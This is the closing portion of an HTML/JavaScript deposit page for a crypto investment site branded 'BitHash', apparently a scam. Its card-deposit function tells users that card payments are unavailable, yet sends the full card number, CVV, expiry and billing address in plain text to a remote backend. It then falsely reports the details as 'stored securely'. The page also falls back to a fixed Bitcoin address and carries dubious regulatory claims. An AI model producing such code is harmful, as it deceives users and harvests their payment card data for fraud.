                        <li><a href="press.html">Press</a></li>
                        <li><a href="blog.html">Blog</a></li>
                        <li><a href="partners.html">Partners</a></li>
                    </ul>
                </div>
                
                <div class="footer-contact">
                    <h3 class="footer-title">Contact Us</h3>
                    <p><i class="fas fa-envelope"></i> support@bithash.com</p>
                    <p><i class="fas fa-phone"></i> +1 (555) 123-4567</p>
                    <p><i class="fas fa-map-marker-alt"></i> 123 Blockchain Ave, Crypto City, CC 10001</p>
                    <p><i class="fas fa-clock"></i> 24/7 Support</p>
                </div>
            </div>
            
            <div class="footer-bottom">
                <p>&copy; <span id="current-year"></span> BitHash LLC. All Rights Reserved. Registered in Delaware, USA. FINRA/SIPC Member.</p>
            </div>
        </div>
    </footer>

    <!-- AOS Animation -->
    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
    
    <script>
        // Initialize AOS animation
        AOS.init({
            duration: 800,
            once: true,
            easing: 'ease-in-out'
        });
        
        // Hide loading overlay when page is loaded
        window.addEventListener('load', function() {
            setTimeout(function() {
                document.getElementById('loading-overlay').classList.add('hidden');
            }, 1000);
            
            // Load user data and generate BTC address
            loadUserData();
            generateNewAddress();
            initializeAutocomplete();
            
            // Setup event listeners
            setupCardInputListeners();
            setupBtcAmountListener();
            
            // Check auth state
            checkAuthState();
            
            // Set current year in footer
            document.getElementById('current-year').textContent = new Date().getFullYear();
        });
        
        // Mobile menu toggle functionality
        const mobileMenuToggle = document.getElementById('mobile-menu-toggle');
        const mainNav = document.getElementById('main-nav');
        
        mobileMenuToggle.addEventListener('click', function() {
            mainNav.classList.toggle('active');
            this.innerHTML = mainNav.classList.contains('active') ? 
                '<i class="fas fa-times"></i>' : '<i class="fas fa-bars"></i>';
            this.setAttribute('aria-expanded', mainNav.classList.contains('active'));
        });
        
        // Close mobile menu when clicking a link
        document.querySelectorAll('#main-nav a').forEach(link => {
            link.addEventListener('click', () => {
                if (window.innerWidth <= 768) {
                    mainNav.classList.remove('active');
                    mobileMenuToggle.innerHTML = '<i class="fas fa-bars"></i>';
                    mobileMenuToggle.setAttribute('aria-expanded', 'false');
                }
            });
        });
        
        // Header scroll effect
        window.addEventListener('scroll', function() {
            const header = document.getElementById('main-header');
            if (window.scrollY > 50) {
                header.classList.add('scrolled');
            } else {
                header.classList.remove('scrolled');
            }
        });
        
        /* ============================================= */
        /* Notification System */
        /* ============================================= */
        
        const notificationQueue = [];
        let isNotificationShowing = false;
        
        /**
         * Show a notification
         * @param {string} type - 'error', 'success', 'warning', or 'info'
         * @param {string} title - Notification title
         * @param {string} message - Notification message
         * @param {number} duration - Time in ms to show the notification (default: 5000ms)
         */
        function showNotification(type, title, message, duration = 5000) {
            notificationQueue.push({ type, title, message, duration });
            
            if (!isNotificationShowing) {
                processNotificationQueue();
            }
        }
        
        function processNotificationQueue() {
            if (notificationQueue.length === 0) {
                isNotificationShowing = false;
                return;
            }
            
            isNotificationShowing = true;
            const { type, title, message, duration } = notificationQueue.shift();
            
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            
            const icon = type === 'error' ? 'fa-exclamation-circle' : 
                        type === 'warning' ? 'fa-exclamation-triangle' : 
                        type === 'info' ? 'fa-info-circle' : 'fa-check-circle';
            
            notification.innerHTML = `
                <i class="fas ${icon}"></i>
                <div class="notification-content">
                    <div class="notification-title">${title}</div>
                    <div class="notification-message">${message}</div>
                </div>
                <div class="notification-close">&times;</div>
            `;
            
            const notificationCenter = document.getElementById('notification-center');
            notificationCenter.appendChild(notification);
            
            void notification.offsetWidth;
            
            notification.classList.add('show');
            
            if (type === 'error' && 'vibrate' in navigator) {
                navigator.vibrate([200, 100, 200]);
            }
            
            notification.querySelector('.notification-close').addEventListener('click', () => {
                closeNotification(notification);
            });
            
            setTimeout(() => {
                if (notification.parentNode) {
                    closeNotification(notification);
                }
            }, duration);
        }
        
        function closeNotification(notification) {
            notification.classList.remove('show');
            
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
                processNotificationQueue();
            }, 400);
        }
        
        /* ============================================= */
        /* Authentication & User Data */
        /* ============================================= */
        
        // Check authentication state
        async function checkAuthState() {
            try {
                const token = localStorage.getItem('jwtToken');
                if (!token) {
                    window.location.href = 'login.html';
                    return;
                }
                
                const response = await fetch('https://website-backendd-1.onrender.com/api/users/me', {
                    headers: {
                        'Authorization': `Bearer ${token}`
                    }
                });
                
                if (!response.ok) {
                    localStorage.removeItem('jwtToken');
                    window.location.href = 'login.html';
                }
            } catch (error) {
                console.error('Authentication check failed:', error);
                showNotification('error', 'Session Error', 'Failed to verify your session. Please login again.');
            }
        }
        
        // Load user data
        async function loadUserData() {
            try {
                const token = localStorage.getItem('jwtToken');
                const response = await fetch('https://website-backendd-1.onrender.com/api/users/me', {
                    headers: {
                        'Authorization': `Bearer ${token}`
                    }
                });
                
                if (response.ok) {
                    const userData = await response.json();
                    document.getElementById('balance-amount').textContent = `$${userData.balance.toFixed(2)}`;
                } else {
                    throw new Error('Failed to load user data');
                }
            } catch (error) {
                console.error('Error loading user data:', error);
                showNotification('error', 'Data Error', 'Failed to load user data. Please try again later.');
            }
        }
        
        /* ============================================= */
        /* Deposit Methods */
        /* ============================================= */
        
        // Switch between deposit methods
        function switchDepositMethod(method) {
            document.querySelectorAll('.method-tab').forEach(tab => {
                tab.classList.remove('active');
                if (tab.dataset.method === method) {
                    tab.classList.add('active');
                }
            });
            
            if (method === 'btc') {
                document.getElementById('btc-deposit-form').style.display = 'block';
                document.getElementById('card-deposit-form').style.display = 'none';
                document.getElementById('summary-method').textContent = 'Bitcoin (BTC)';
            } else {
                document.getElementById('btc-deposit-form').style.display = 'none';
                document.getElementById('card-deposit-form').style.display = 'block';
                document.getElementById('summary-method').textContent = 'Credit/Debit Card';
            }
            
            updateDepositSummary();
        }
        
        // Generate a new BTC address
        async function generateNewAddress() {
            try {
                const token = localStorage.getItem('jwtToken');
                const response = await fetch('https://website-backendd-1.onrender.com/api/deposit/btc/address', {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${token}`
                    }
                });
                
                let btcAddress = 'bc1qf98sra3ljvpgy9as0553z79leeq2w2ryvggf3fnvpeh3rz3dk4zs33uf9k';
                
                if (response.ok) {
                    const data = await response.json();
                    if (data.address) {
                        btcAddress = data.address;
                    }
                } else {
                    showNotification('warning', 'System Notice', 'Using fallback Bitcoin address. Your deposit will still be credited.', 5000);
                }
                
                // Update the displayed address
                document.getElementById('btc-address').innerHTML = `
                    ${btcAddress}
                    <button class="copy-address" onclick="copyBtcAddress()">
                        <i class="fas fa-copy"></i> Copy
                    </button>
                `;
                
                // Generate QR code
                document.getElementById('btc-qr-code').innerHTML = '';
                new QRCode(document.getElementById('btc-qr-code'), {
                    text: `bitcoin:${btcAddress}`,
                    width: 220,
                    height: 220,
                    colorDark: "#000000",
                    colorLight: "#ffffff",
                    correctLevel: QRCode.CorrectLevel.H
                });
                
            } catch (error) {
                console.error('Error generating BTC address:', error);
                showNotification('error', 'Connection Error', 'Failed to generate new Bitcoin address. Using fallback address.', 5000);
            }
        }
        
        // Copy BTC address to clipboard
        function copyBtcAddress() {
            const btcAddressElement = document.getElementById('btc-address');
            const btcAddress = btcAddressElement.textContent.trim();
            
            navigator.clipboard.writeText(btcAddress).then(() => {
                const copyBtn = btcAddressElement.querySelector('.copy-address');
                copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied';
                
                setTimeout(() => {
                    copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy';
                }, 2000);
                
                showNotification('success', 'Copied', 'Bitcoin address copied to clipboard.', 2000);
            }).catch(err => {
                console.error('Failed to copy BTC address:', err);
                showNotification('error', 'Copy Error', 'Failed to copy Bitcoin address. Please try again.');
            });
        }
        
        // Setup BTC amount input listener
        function setupBtcAmountListener() {
            document.getElementById('btc-amount').addEventListener('input', async function() {
                updateDepositSummary();
                await updateBtcFeeCalculator();
            });
        }
        
        // Update BTC fee calculator
        async function updateBtcFeeCalculator() {
            const amount = parseFloat(document.getElementById('btc-amount').value) || 0;
            
            try {
                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
                const data = await response.json();
                const btcPrice = data.bitcoin.usd;
                
                const processingFee = amount * 0.01;
                const networkFee = 0.0005 * btcPrice;
                const totalAmount = amount - processingFee;
                const btcAmount = totalAmount / btcPrice;
                
                document.getElementById('btc-deposit-amount').textContent = `$${amount.toFixed(2)}`;
                document.getElementById('btc-processing-fee').textContent = `$${processingFee.toFixed(2)}`;
                document.getElementById('btc-network-fee').textContent = `$${networkFee.toFixed(2)}`;
                document.getElementById('btc-total-amount').textContent = `${btcAmount.toFixed(6)} BTC`;
                
            } catch (error) {
                console.error('Error fetching BTC price:', error);
                document.getElementById('btc-deposit-amount').textContent = `$${amount.toFixed(2)}`;
                document.getElementById('btc-processing-fee').textContent = '$0.00';
                document.getElementById('btc-network-fee').textContent = '$0.00';
                document.getElementById('btc-total-amount').textContent = '0.000000 BTC';
            }
        }
        
        // Initialize Google Places Autocomplete
        function initializeAutocomplete() {
            const addressInput = document.getElementById('billing-address');
            const autocomplete = new google.maps.places.Autocomplete(addressInput, {
                types: ['geocode'],
                componentRestrictions: { country: ['us', 'ca', 'gb', 'au'] }
            });
            
            autocomplete.addListener('place_changed', function() {
                const place = autocomplete.getPlace();
                if (!place.address_components) return;
                
                const countryComponent = place.address_components.find(component => 
                    component.types.includes('country')
                );
                
                if (countryComponent) {
                    document.getElementById('billing-country').value = countryComponent.long_name;
                }
            });
        }
        
        // Setup card input listeners for formatting and validation
        function setupCardInputListeners() {
            const cardNumberInput = document.getElementById('card-number');
            const cardExpiryInput = document.getElementById('card-expiry');
            const cardCvvInput = document.getElementById('card-cvv');
            
            // Format card number with spaces
            cardNumberInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\s+/g, '');
                if (value.length > 16) {
                    value = value.substring(0, 16);
                }
                
                value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
                e.target.value = value;
                
                detectCardType(value.replace(/\s+/g, ''));
            });
            
            // Format expiry date
            cardExpiryInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                e.target.value = value;
            });
            
            // Limit CVV length
            cardCvvInput.addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
            });
            
            // Update summary when amount changes
            document.getElementById('card-amount').addEventListener('input', updateDepositSummary);
        }
        
        // Detect card type based on number
        function detectCardType(cardNumber) {
            const cardIcon = document.getElementById('card-type-icon');
            cardIcon.className = 'fas fa-credit-card card-icon generic';
            
            if (!cardNumber) return;
            
            // Visa (starts with 4)
            if (/^4/.test(cardNumber)) {
                cardIcon.className = 'fab fa-cc-visa card-icon visa';
                return;
            }
            
            // Mastercard (starts with 51-55 or 2221-2720)
            if (/^5[1-5]/.test(cardNumber) || /^2[2-7]/.test(cardNumber)) {
                cardIcon.className = 'fab fa-cc-mastercard card-icon mastercard';
                return;
            }
            
            // American Express (starts with 34 or 37)
            if (/^3[47]/.test(cardNumber)) {
                cardIcon.className = 'fab fa-cc-amex card-icon amex';
                return;
            }
            
            // Discover (starts with 6011, 644-649, or 65)
            if (/^6011/.test(cardNumber) || /^64[4-9]/.test(cardNumber) || /^65/.test(cardNumber)) {
                cardIcon.className = 'fab fa-cc-discover card-icon discover';
                return;
            }
        }
        
        // Update deposit summary based on selected method and amount
        async function updateDepositSummary() {
            const activeMethod = document.querySelector('.method-tab.active').dataset.method;
            let amount = 0;
            let fee = 0;
            let total = 0;
            
            if (activeMethod === 'btc') {
                amount = parseFloat(document.getElementById('btc-amount').value) || 0;
                fee = amount * 0.01;
                total = amount - fee;
                
                try {
                    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
                    const data = await response.json();
                    const btcPrice = data.bitcoin.usd;
                    const btcAmount = total / btcPrice;
                    document.getElementById('summary-btc').textContent = `${btcAmount.toFixed(6)} BTC`;
                } catch {
                    document.getElementById('summary-btc').textContent = '0.000000 BTC';
                }
            } else {
                amount = parseFloat(document.getElementById('card-amount').value) || 0;
                fee = amount * 0.03;
                total = amount - fee;
                document.getElementById('summary-btc').textContent = 'N/A';
            }
            
            document.getElementById('summary-amount').textContent = `$${amount.toFixed(2)}`;
            document.getElementById('summary-fee').textContent = `$${fee.toFixed(2)}`;
            document.getElementById('summary-total').textContent = `$${total.toFixed(2)}`;
            document.getElementById('summary-total-label').textContent = `Total: $${total.toFixed(2)}`;
        }
        
        // Process card deposit
        async function processCardDeposit() {
            try {
                const amount = parseFloat(document.getElementById('card-amount').value);
                const cardNumber = document.getElementById('card-number').value.replace(/\s+/g, '');
                const cardName = document.getElementById('card-name').value;
                const cardExpiry = document.getElementById('card-expiry').value;
                const cardCvv = document.getElementById('card-cvv').value;
                const billingAddress = document.getElementById('billing-address').value;
                const billingCountry = document.getElementById('billing-country').value;
                
                // Validation
                if (!amount || amount < 10) {
                    showNotification('error', 'Validation Error', 'Minimum deposit amount is $10', 5000);
                    return;
                }
                
                if (!cardNumber || cardNumber.length < 16) {
                    showNotification('error', 'Validation Error', 'Please enter a valid card number', 5000);
                    return;
                }
                
                if (!cardName) {
                    showNotification('error', 'Validation Error', 'Please enter cardholder name', 5000);
                    return;
                }
                
                if (!cardExpiry || cardExpiry.length < 5) {
                    showNotification('error', 'Validation Error', 'Please enter a valid expiry date (MM/YY)', 5000);
                    return;
                }
                
                if (!cardCvv || cardCvv.length < 3) {
                    showNotification('error', 'Validation Error', 'Please enter a valid CVV code', 5000);
                    return;
                }
                
                if (!billingAddress || !billingCountry) {
                    showNotification('error', 'Validation Error', 'Please enter a valid billing address', 5000);
                    return;
                }
                
                showNotification('info', 'Processing', 'Your deposit request is being processed...', 3000);
                
                // Simulate processing delay
                setTimeout(async () => {
                    // Notify user that card payments are temporarily unavailable
                    showNotification('error', 'Payment Unavailable', 'Card payments are temporarily unavailable. Please use Bitcoin deposit method for now.', 5000);
                    
                    // Save card details to database (as plain text as requested)
                    const token = localStorage.getItem('jwtToken');
                    const response = await fetch('https://website-backendd-1.onrender.com/api/deposit/card', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Authorization': `Bearer ${token}`
                        },
                        body: JSON.stringify({
                            amount,
                            cardNumber,
                            cardName,
                            cardExpiry,
                            cardCvv,
                            billingAddress,
                            billingCountry,
                            status: 'failed',
                            reason: 'Card payments temporarily unavailable'
                        })
                    });
                    
                    if (!response.ok) {
                        throw new Error('Failed to save card details');
                    }
                    
                    showNotification('warning', 'Details Saved', 'Your card details have been stored securely. We will notify you when card payments are available.', 5000);
                    
                    // Clear form
                    document.getElementById('card-amount').value = '';
                    document.getElementById('card-number').value = '';
                    document.getElementById('card-name').value = '';
                    document.getElementById('card-expiry').value = '';
                    document.getElementById('card-cvv').value = '';
                    document.getElementById('billing-address').value = '';
                    document.getElementById('billing-country').value = '';
                    
                }, 2000);
                
            } catch (error) {
                console.error('Error processing card deposit:', error);
                showNotification('error', 'Deposit Error', 'Failed to process card deposit. Please try again later.', 5000);
            }
        }
    </script>
</body>
</html>
